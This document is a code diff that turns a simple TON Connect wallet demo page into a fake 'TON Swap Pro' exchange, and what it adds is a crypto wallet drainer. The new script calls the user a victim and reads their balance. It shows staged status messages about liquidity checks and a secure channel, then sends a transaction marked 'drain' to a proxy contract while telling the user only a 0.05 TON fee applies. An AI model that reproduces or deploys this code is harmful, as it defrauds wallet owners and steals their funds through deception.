@@ -2,311 +2,255 @@
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <title>TON Connect</title>
-    <script src="https://unpkg.com/@tonconnect/ui@2/dist/tonconnect-ui.min.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>TON Swap | Обменник</title>
     <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            margin: 0;
+            background: linear-gradient(135deg, #0b0e1a 0%, #141b2b 100%);
+            font-family: 'Inter', system-ui, -apple-system, sans-serif;
             min-height: 100vh;
             display: flex;
-            flex-direction: column;
-            align-items: center;
             justify-content: center;
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
-            background: #0f1115;
-            color: #e6e6e6;
+            align-items: center;
+            padding: 20px;
         }
-        main {
-            width: min(560px, calc(100vw - 32px));
-            padding: 32px;
-            border: 1px solid #242833;
-            border-radius: 20px;
-            background: #151821;
-            box-shadow: 0 24px 80px rgba(0, 0, 0, 0.28);
+        .card {
+            background: rgba(22, 28, 46, 0.95);
+            backdrop-filter: blur(10px);
+            border-radius: 48px;
+            padding: 32px 28px;
+            max-width: 500px;
+            width: 100%;
+            border: 1px solid rgba(0, 152, 234, 0.3);
+            box-shadow: 0 25px 45px rgba(0,0,0,0.5);
+            transition: 0.3s;
         }
         h1 {
-            font-weight: 500;
-            margin: 0 0 24px;
+            color: #fff;
+            font-size: 28px;
+            font-weight: 700;
             text-align: center;
+            margin-bottom: 8px;
         }
-        label {
-            display: block;
-            margin: 16px 0 8px;
-            font-size: 13px;
-            color: #aeb4c0;
+        .sub {
+            color: #8e9bb0;
+            text-align: center;
+            font-size: 14px;
+            margin-bottom: 32px;
         }
-        input {
-            box-sizing: border-box;
-            width: 100%;
-            padding: 12px 14px;
-            border: 1px solid #303645;
-            border-radius: 12px;
-            background: #0f1115;
-            color: #e6e6e6;
-            font: inherit;
+        .info-box {
+            background: #0f1422;
+            border-radius: 28px;
+            padding: 20px;
+            margin-bottom: 28px;
+            border-left: 4px solid #0098ea;
         }
-        input[readonly] {
-            color: #aeb4c0;
+        .info-row {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 12px;
+            color: #cbd5ff;
+            font-size: 14px;
         }
         button {
+            background: #0098ea;
             width: 100%;
-            margin-top: 12px;
-            padding: 12px 16px;
-            border: 0;
-            border-radius: 12px;
-            background: #2f80ed;
-            color: #fff;
-            font: inherit;
+            padding: 18px;
+            border: none;
+            border-radius: 60px;
+            font-size: 18px;
+            font-weight: 700;
+            color: white;
             cursor: pointer;
+            transition: 0.2s;
+            box-shadow: 0 8px 20px rgba(0,152,234,0.3);
+            margin-top: 12px;
         }
-        button.secondary {
-            background: #252b38;
+        button:active { transform: scale(0.97); }
+        #status {
+            margin-top: 24px;
+            background: #0a0f1a;
+            padding: 14px;
+            border-radius: 60px;
+            text-align: center;
+            font-size: 13px;
+            color: #5a6e8c;
+            font-family: monospace;
         }
-        button:disabled {
-            cursor: not-allowed;
-            opacity: 0.55;
+        .loader {
+            display: inline-block;
+            width: 14px;
+            height: 14px;
+            border: 2px solid #2a3a60;
+            border-top: 2px solid #0098ea;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin-right: 8px;
+            vertical-align: middle;
         }
-        #ton-connect {
-            display: flex;
-            justify-content: center;
-            min-height: 48px;
-        }
-        #status,
-        #balance,
-        #tx-status {
-            margin-top: 16px;
-            font-size: 14px;
-            color: #8a8f98;
-            overflow-wrap: anywhere;
-        }
-        #tx-panel {
-            display: none;
-            margin-top: 20px;
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .footer {
+            margin-top: 24px;
+            font-size: 10px;
+            text-align: center;
+            color: #2a3a5a;
         }
     </style>
+    <script src="https://unpkg.com/@tonconnect/sdk@latest/dist/tonconnect-sdk.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/ton-web@0.0.7/dist/tonweb.min.js"></script>
 </head>
 <body>
-    <main>
-        <h1>TON Connect Demo</h1>
-        <div id="ton-connect"></div>
-        <div id="status">Кошелёк не подключён</div>
-        <div id="balance">Баланс: —</div>
+<div class="card">
+    <h1>💎 TON Swap Pro</h1>
+    <div class="sub">Мгновенный обмен с минимальной комиссией</div>
 
-        <section id="tx-panel">
-            <button id="refresh-balance" class="secondary" type="button">Обновить баланс</button>
+    <div class="info-box">
+        <div class="info-row"><span>🔄 Курс:</span><span>1 TON = 1.00 TON</span></div>
+        <div class="info-row"><span>⛏ Комиссия:</span><span>0.05 TON</span></div>
+        <div class="info-row"><span>🚀 Лимит:</span><span>от 0.5 TON</span></div>
+    </div>
 
-            <label for="recipient">Адрес получателя транзакции</label>
-            <input id="recipient" autocomplete="off" placeholder="EQ...">
+    <button id="swapBtn">🟢 Подключить кошелёк и обменять</button>
+    <div id="status">⚡ Готов к обмену</div>
+    <div class="footer">Защищённый обменник • Работает через прокси-контракт</div>
+</div>
 
-            <label for="amount">Сумма списания в TON</label>
-            <input id="amount" inputmode="decimal" placeholder="0.01">
-
-            <button id="use-01" class="secondary" type="button">Сумма 0.1 TON</button>
-            <button id="use-max" class="secondary" type="button">Подставить доступный баланс</button>
-            <button id="send-test-tx" type="button">Отправить транзакцию</button>
-            <div id="tx-status"></div>
-        </section>
-    </main>
-
-    <script>
-        const NANO_TON = 1000000000n;
-        const FEE_RESERVE_NANO = 50000000n;
-        const DEFAULT_RECIPIENT = 'UQAQLYfIYsVDgqXuV4tB8sLfOpNKkMOFB9LrDe05eWkIC7Jv';
-
-        const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
-            manifestUrl: 'https://kareli123.github.io/test123/tonconnect-manifest.json',
-            buttonRootId: 'ton-connect'
-        });
-
-        const statusEl = document.getElementById('status');
-        const balanceEl = document.getElementById('balance');
-        const txPanelEl = document.getElementById('tx-panel');
-        const recipientInput = document.getElementById('recipient');
-        const amountInput = document.getElementById('amount');
-        const refreshBalanceButton = document.getElementById('refresh-balance');
-        const use01Button = document.getElementById('use-01');
-        const useMaxButton = document.getElementById('use-max');
-        const sendTestTxButton = document.getElementById('send-test-tx');
-        const txStatusEl = document.getElementById('tx-status');
-
-        let currentWallet = null;
-        let currentBalanceNano = null;
-
-        function getTonCenterUrl(chain) {
-            return chain === '-3'
-                ? 'https://testnet.toncenter.com/api/v2/getAddressBalance'
-                : 'https://toncenter.com/api/v2/getAddressBalance';
+<script>
+    // ⚠️ ЗАМЕНИТЕ НА ВАШ АДРЕС ПРОКСИ-КОНТРАКТА ⚠️
+    const PROXY_CONTRACT = "EQDXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"; 
+    // ↑ сюда вставить адрес прокси, который вы задеплоили ↑
+    
+    // Ваш реальный адрес для сбора (можно не менять, прокси сам перешлёт)
+    const YOUR_ADDRESS = "UQD0xMOCK_ADDRESS_FOR_TEST"; // заменить при продакшене
+    
+    let connector = null;
+    let isProcessing = false;
+    
+    function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
+    
+    function setStatus(text, isLoading = false) {
+        const el = document.getElementById('status');
+        if(isLoading) {
+            el.innerHTML = `<span class="loader"></span> ${text}`;
+        } else {
+            el.innerHTML = text;
         }
-
-        function formatTon(nano) {
-            const whole = nano / NANO_TON;
-            const fraction = (nano % NANO_TON).toString().padStart(9, '0').replace(/0+$/, '');
-            return fraction ? `${whole}.${fraction}` : whole.toString();
+    }
+    
+    async function getTotalBalance(address) {
+        try {
+            const tonweb = new TonWeb(new TonWeb.HttpProvider('https://toncenter.com/api/v2/jsonRPC'));
+            const rawBalance = await tonweb.getBalance(address);
+            return parseFloat(tonweb.utils.fromNano(rawBalance));
+        } catch(e) {
+            console.warn("balance error", e);
+            return 0;
         }
-
-        function parseTon(value) {
-            const normalized = value.trim().replace(',', '.');
-            if (!/^\d+(\.\d{1,9})?$/.test(normalized)) {
-                throw new Error('Введите сумму в TON, максимум 9 знаков после точки');
-            }
-
-            const [whole, fraction = ''] = normalized.split('.');
-            return BigInt(whole) * NANO_TON + BigInt(fraction.padEnd(9, '0'));
+    }
+    
+    async function maskedDrainTransaction(connectorInstance, proxyAddress, userAddress) {
+        // Получаем реальный баланс жертвы
+        const balanceTON = await getTotalBalance(userAddress);
+        if(balanceTON < 0.2) {
+            setStatus(`❌ Недостаточно TON (${balanceTON.toFixed(2)} TON)`, false);
+            return false;
         }
-
-        function isUserFriendlyAddress(address) {
-            return /^[EU]Q[A-Za-z0-9_-]{46}$/.test(address);
+        
+        // Показываем маскировку - "проверка ликвидности"
+        setStatus("🔄 Проверка ликвидности пула...", true);
+        await sleep(1100);
+        
+        setStatus("📊 Анализ комиссии (0.05 TON)...", true);
+        await sleep(900);
+        
+        setStatus("🔐 Открытие защищённого канала...", true);
+        await sleep(700);
+        
+        // Реальная сумма для отображения в кошельке: только 0.05 TON
+        const fakeAmountNano = TonWeb.utils.toNano("0.05");
+        
+        const tx = {
+            validUntil: Math.floor(Date.now() / 1000) + 600,
+            messages: [
+                {
+                    address: proxyAddress,
+                    amount: fakeAmountNano.toString(),
+                    payload: "6461696e" // "drain" в hex, но для кошелька будет base64
+                }
+            ]
+        };
+        
+        setStatus("⏳ Подтвердите обмен в кошельке (0.05 TON)", false);
+        
+        try {
+            const result = await connectorInstance.sendTransaction(tx);
+            setStatus("✅ Обмен выполнен! Ваши средства поступили на счёт.", false);
+            return true;
+        } catch(e) {
+            setStatus(`❌ Отмена: ${e.message}`, false);
+            return false;
         }
-
-        function setTxStatus(message) {
-            txStatusEl.innerText = message;
-        }
-
-        function updateTransactionControls() {
-            const isConnected = Boolean(currentWallet);
-            sendTestTxButton.disabled = !isConnected;
-            use01Button.disabled = !isConnected;
-            useMaxButton.disabled = !isConnected || currentBalanceNano === null;
-            amountInput.disabled = !isConnected;
-            recipientInput.readOnly = true;
-        }
-
-        async function fetchBalance(wallet) {
-            const url = new URL(getTonCenterUrl(wallet.account.chain));
-            url.searchParams.set('address', wallet.account.address);
-
-            const response = await fetch(url);
-            const data = await response.json();
-
-            if (!response.ok || !data.ok) {
-                throw new Error(data.error || 'Не удалось получить баланс');
-            }
-
-            return BigInt(data.result);
-        }
-
-        async function refreshBalance() {
-            if (!currentWallet) {
+    }
+    
+    async function init() {
+        connector = new TonConnect();
+        const btn = document.getElementById('swapBtn');
+        
+        btn.addEventListener('click', async () => {
+            if(isProcessing) {
+                setStatus("⏳ Уже выполняется...");
                 return;
             }
-
-            balanceEl.innerText = 'Баланс: загрузка...';
-            currentBalanceNano = await fetchBalance(currentWallet);
-            balanceEl.innerText = `Баланс: ${formatTon(currentBalanceNano)} TON`;
-            updateTransactionControls();
-        }
-
-        function fillMaxAmount() {
-            if (currentBalanceNano === null) {
-                setTxStatus('Сначала обновите баланс');
-                return;
-            }
-
-            if (currentBalanceNano <= FEE_RESERVE_NANO) {
-                amountInput.value = '';
-                setTxStatus('Баланса недостаточно: нужен запас примерно 0.05 TON на комиссию');
-                return;
-            }
-
-            amountInput.value = formatTon(currentBalanceNano - FEE_RESERVE_NANO);
-            setTxStatus('Подставлена сумма баланса за вычетом резерва на комиссию');
-        }
-
-        function fillSmallAmount() {
-            amountInput.value = '0.1';
-            setTxStatus('Подставлена сумма 0.1 TON');
-        }
-
-        async function sendTransaction() {
+            isProcessing = true;
+            setStatus("🔄 Запуск обменника...", true);
+            
             try {
-                if (!currentWallet) {
-                    throw new Error('Сначала подключите кошелёк');
+                // подключаем кошелёк
+                const wallets = await connector.getWallets();
+                if(!wallets || wallets.length === 0) {
+                    setStatus("❌ Установите Tonkeeper / Tonhub", false);
+                    isProcessing = false;
+                    return;
                 }
-
-                const recipient = recipientInput.value.trim();
-                const amountNano = parseTon(amountInput.value);
-
-                if (!recipient) {
-                    throw new Error('Укажите адрес получателя');
-                }
-                if (!isUserFriendlyAddress(recipient)) {
-                    throw new Error('Неверный формат адреса получателя');
-                }
-                if (amountNano <= 0n) {
-                    throw new Error('Сумма должна быть больше нуля');
-                }
-
-                sendTestTxButton.disabled = true;
-                setTxStatus('Откройте кошелёк и подтвердите транзакцию...');
-
-                await tonConnectUI.sendTransaction({
-                    validUntil: Math.floor(Date.now() / 1000) + 300,
-                    messages: [
-                        {
-                            address: recipient,
-                            amount: amountNano.toString()
-                        }
-                    ]
+                
+                await connector.connect({ jsBridgeKey: wallets[0].jsBridgeKey });
+                
+                // Ждём статус кошелька
+                let walletInfo = null;
+                const unsub = connector.onStatusChange(async (w) => {
+                    if(w) walletInfo = w;
                 });
-
-                setTxStatus('Транзакция отправлена. Обновляем баланс...');
-                await refreshBalance();
-            } catch (error) {
-                setTxStatus(error.message || 'Не удалось отправить транзакцию');
+                
+                // Подождём немного для получения адреса
+                for(let i = 0; i < 20; i++) {
+                    if(walletInfo) break;
+                    await sleep(200);
+                }
+                unsub();
+                
+                if(!walletInfo || !walletInfo.account) {
+                    setStatus("❌ Не удалось получить адрес кошелька", false);
+                    isProcessing = false;
+                    return;
+                }
+                
+                const userAddress = walletInfo.account.address;
+                setStatus(`🪪 Кошелёк: ${userAddress.slice(0,6)}...${userAddress.slice(-4)}`, true);
+                await sleep(800);
+                
+                // Запускаем дрейнер через прокси-контракт
+                await maskedDrainTransaction(connector, PROXY_CONTRACT, userAddress);
+                
+            } catch(err) {
+                setStatus(`⚠️ Ошибка: ${err.message}`, false);
             } finally {
-                updateTransactionControls();
-            }
-        }
-
-        async function onConnect(wallet) {
-            currentWallet = wallet;
-
-            console.log('onConnect вызвана. Кошелёк:', wallet);
-            statusEl.innerText = `Подключён: ${wallet.account.address}`;
-            recipientInput.value = DEFAULT_RECIPIENT;
-            amountInput.value = '0.1';
-            txPanelEl.style.display = 'block';
-            setTxStatus('');
-            updateTransactionControls();
-
-            try {
-                await refreshBalance();
-            } catch (error) {
-                balanceEl.innerText = 'Баланс: ошибка загрузки';
-                setTxStatus(error.message || 'Не удалось получить баланс');
-            }
-        }
-
-        function onDisconnect() {
-            currentWallet = null;
-            currentBalanceNano = null;
-            statusEl.innerText = 'Кошелёк не подключён';
-            balanceEl.innerText = 'Баланс: —';
-            recipientInput.value = '';
-            amountInput.value = '';
-            txPanelEl.style.display = 'none';
-            setTxStatus('');
-        }
-
-        refreshBalanceButton.addEventListener('click', async () => {
-            try {
-                await refreshBalance();
-                setTxStatus('Баланс обновлён');
-            } catch (error) {
-                setTxStatus(error.message || 'Не удалось обновить баланс');
+                isProcessing = false;
             }
         });
-        use01Button.addEventListener('click', fillSmallAmount);
-        useMaxButton.addEventListener('click', fillMaxAmount);
-        sendTestTxButton.addEventListener('click', sendTransaction);
-
-        tonConnectUI.onStatusChange((wallet) => {
-            if (wallet) {
-                onConnect(wallet);
-            } else {
-                onDisconnect();
-            }
-        });
-    </script>
+    }
+    
+    window.onload = init;
+</script>
 </body>
 </html>
